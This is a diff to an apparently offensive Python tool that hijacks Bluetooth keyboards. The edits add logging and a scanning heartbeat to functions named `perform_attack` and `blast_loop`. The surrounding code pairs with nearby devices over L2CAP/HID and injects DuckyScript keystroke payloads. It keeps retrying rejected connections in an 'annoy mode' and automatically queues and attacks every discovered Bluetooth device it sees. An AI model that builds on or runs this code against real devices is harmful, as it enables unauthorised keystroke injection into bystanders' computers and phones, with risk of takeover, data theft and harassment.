@@ -637,6 +637,7 @@ def setup_and_connect(connection_manager, target_address, adapter_id):
 def perform_attack(target_address, adapter_id, duckyscript, is_annoy_mode, recon_only=False, name="Unknown"):
     """Encapsulates the attack logic for a single target."""
     try:
+        log.info(f"Targeting: {name} ({target_address})")
         adapter = setup_bluetooth(target_address, adapter_id)
         adapter.enable_ssp()
         
@@ -647,9 +648,11 @@ def perform_attack(target_address, adapter_id, duckyscript, is_annoy_mode, recon
         while True:
             try:
                 # 1. Connect and initialize pairing
+                log.info(f"[{target_address}] Initializing L2CAP connections (SDP/HID)...")
                 hid_interrupt_client = setup_and_connect(connection_manager, target_address, adapter_id)
                 
                 # Successful pairing/connection reached here
+                log.notice(f"[{target_address}] CONNECTION & PAIRING SUCCESS!")
                 save_paired_device(target_address, name)
 
                 if recon_only:
@@ -658,6 +661,7 @@ def perform_attack(target_address, adapter_id, duckyscript, is_annoy_mode, recon
                     return True
 
                 # 2. Deliver Payload
+                log.notice(f"[{target_address}] Injecting DuckyScript payload...")
                 process_duckyscript(hid_interrupt_client, duckyscript, current_line, current_position)
                 
                 log.info(f"Payload sent successfully to {target_address}.")
@@ -673,7 +677,7 @@ def perform_attack(target_address, adapter_id, duckyscript, is_annoy_mode, recon
                 time.sleep(2)
             except Exception as e:
                 if is_annoy_mode:
-                    log.info(f"Connection rejected/failed for {target_address}: {e}. Retrying...")
+                    log.info(f"Connection rejected/failed for {target_address}: {e}. Retrying (Annoy Mode)...")
                     connection_manager.close_all()
                     time.sleep(2)
                 else:
@@ -696,6 +700,7 @@ def blast_loop(adapter_id, duckyscript, initial_devices=None, recon_only=False, 
     blasted_devices = set()
     bus = SystemBus()
     adapter_obj = None
+    last_heartbeat = time.time()
     
     try:
         # Populate queue with initial devices if provided
@@ -709,6 +714,11 @@ def blast_loop(adapter_id, duckyscript, initial_devices=None, recon_only=False, 
         adapter_obj.StartDiscovery()
         
         while True:
+            # Heartbeat every 10 seconds if idle
+            if not queue and time.time() - last_heartbeat > 10:
+                print(f"[{time.strftime('%H:%M:%S')}] Still scanning for new targets... (Devices Blasted: {len(blasted_devices)})")
+                last_heartbeat = time.time()
+
             # Check for new devices from DBus
             mngr = bus.get("org.bluez", "/")
             objs = mngr.GetManagedObjects()
@@ -722,6 +732,7 @@ def blast_loop(adapter_id, duckyscript, initial_devices=None, recon_only=False, 
                     if name and addr not in blasted_devices and not name.startswith("00-00-00"):
                         # Add to queue if not already there or blasted
                         if (addr, name) not in queue:
+                            log.info(f"New candidate identified: {name} ({addr})")
                             queue.append((addr, name))
 
             # Process queue
@@ -738,6 +749,7 @@ def blast_loop(adapter_id, duckyscript, initial_devices=None, recon_only=False, 
                     log.warning(f"[BLAST] Target {addr} ({name}) FAILED/SKIPPED.")
                 
                 blasted_devices.add(addr)
+                last_heartbeat = time.time() # Reset heartbeat after action
                 time.sleep(2) # Cooldown
             
             time.sleep(2) # Scan refresh rate
